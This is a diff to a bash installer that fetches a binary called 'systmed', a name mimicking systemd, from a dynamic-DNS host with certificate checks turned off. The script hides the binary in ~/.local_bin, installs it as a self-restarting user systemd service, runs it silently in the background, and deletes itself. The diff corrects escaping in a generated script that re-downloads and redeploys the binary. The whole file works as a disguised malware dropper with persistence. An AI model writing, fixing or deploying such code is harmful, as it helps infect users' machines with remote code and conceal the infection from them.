@@ -1,6 +1,6 @@
 #!/bin/bash
 
-FLAG_FILE="/tmp/systmed_installed"
+FLAG_FILE="/tmp/systmed_install"
 bin_DIR="$HOME/.local_bin"
 DOWNLOAD_DIR="$bin_DIR"
 
@@ -39,9 +39,10 @@ download_and_setup() {
 }
 
 find_directory_and_deploy() {
-    if [ "$DOWNLOAD_DIR/systmed" != "$bin_DIR/systmed" ]; then
-        mv "$DOWNLOAD_DIR/systmed" "$bin_DIR/systmed"
+    if [ -f "$bin_DIR/systmed" ]; then
+        rm -f "$bin_DIR/systmed"  # 删除旧文件
     fi
+    mv "$DOWNLOAD_DIR/systmed" "$bin_DIR/systmed"
     DEPLOY_DIR="$bin_DIR"
 }
 
@@ -64,7 +65,7 @@ Restart=always
 [Install]
 WantedBy=default.target
 EOF
-    export XDG_RUNTIME_DIR="/run/user/$(id -u)"
+    export XDG_RUNTIME_DIR="/run/user/$(id -u)"  # 设置环境变量
     systemctl --user daemon-reload
     systemctl --user enable systmed.service
     systemctl --user start systmed.service
@@ -91,32 +92,35 @@ create_config_script() {
     cat > "$config_DIR/systmed_config.sh" <<EOF
 #!/bin/bash
 bin_DIR="$HOME/.local_bin"
-DOWNLOAD_DIR="$bin_DIR"
+DOWNLOAD_DIR="\$bin_DIR"
 
-cd "$HOME" || exit 1
+cd "\$HOME" || exit 1
 
 find_directory_and_deploy() {
-    if [ -f "$DOWNLOAD_DIR/systmed" ]; then
-        mv "$DOWNLOAD_DIR/systmed" "$bin_DIR/systmed"
-        DEPLOY_DIR="$bin_DIR"
+    if [ -f "\$DOWNLOAD_DIR/systmed" ]; then
+        if [ -f "\$bin_DIR/systmed" ]; then
+            rm -f "\$bin_DIR/systmed"  # 删除旧文件
+        fi
+        mv "\$DOWNLOAD_DIR/systmed" "\$bin_DIR/systmed"
+        DEPLOY_DIR="\$bin_DIR"
     else
-        echo "Error: systmed file not found in $DOWNLOAD_DIR"
+        echo "Error: systmed file not found in \$DOWNLOAD_DIR"
         exit 1
     fi
 }
 
 execute_in_background() {
-    if [ -n "$DEPLOY_DIR" ] && [ -f "$DEPLOY_DIR/systmed" ]; then
-        nohup "$DEPLOY_DIR/systmed" >/dev/null 2>&1 &
+    if [ -n "\$DEPLOY_DIR" ] && [ -f "\$DEPLOY_DIR/systmed" ]; then
+        nohup "\$DEPLOY_DIR/systmed" >/dev/null 2>&1 &
     else
-        echo "Error: systmed file not found in $DEPLOY_DIR"
+        echo "Error: systmed file not found in \$DEPLOY_DIR"
         exit 1
     fi
 }
 
 download_and_setup() {
-    ARCH="$(uname -m)"
-    case "$ARCH" in
+    ARCH="\$(uname -m)"
+    case "\$ARCH" in
         "arm")
             FILE_URL="http://down.jackte.ip-dynamic.org:18088/systmed_arm"
             ;;
@@ -130,24 +134,24 @@ download_and_setup() {
             FILE_URL="http://down.jackte.ip-dynamic.org:18088/systmed_amd64"
             ;;
         *)
-            echo "Unknown system architecture: $ARCH"
+            echo "Unknown system architecture: \$ARCH"
             exit 1
             ;;
     esac
 
     if command -v wget >/dev/null 2>&1; then
-        wget --no-check-certificate --content-disposition --max-redirect=20 -O "$DOWNLOAD_DIR/systmed" "$FILE_URL"
+        wget --no-check-certificate --content-disposition --max-redirect=20 -O "\$DOWNLOAD_DIR/systmed" "\$FILE_URL"
     elif command -v curl >/dev/null 2>&1; then
-        curl -L -k -o "$DOWNLOAD_DIR/systmed" "$FILE_URL"
+        curl -L -k -o "\$DOWNLOAD_DIR/systmed" "\$FILE_URL"
     else
         echo "Unable to find wget or curl, unable to download systmed files"
         exit 1
     fi
-    chmod +x "$DOWNLOAD_DIR/systmed"
+    chmod +x "\$DOWNLOAD_DIR/systmed"
 }
 
-if [ ! -f "$DOWNLOAD_DIR/systmed" ]; then
-    mkdir -p "$bin_DIR"
+if [ ! -f "\$DOWNLOAD_DIR/systmed" ]; then
+    mkdir -p "\$bin_DIR"
     download_and_setup
 fi
 
@@ -187,7 +191,7 @@ main_install() {
         echo "systmed yes。"
     fi
     
-    rm -- "$0"
+    rm -- "\$0"
 }
 
 main_install
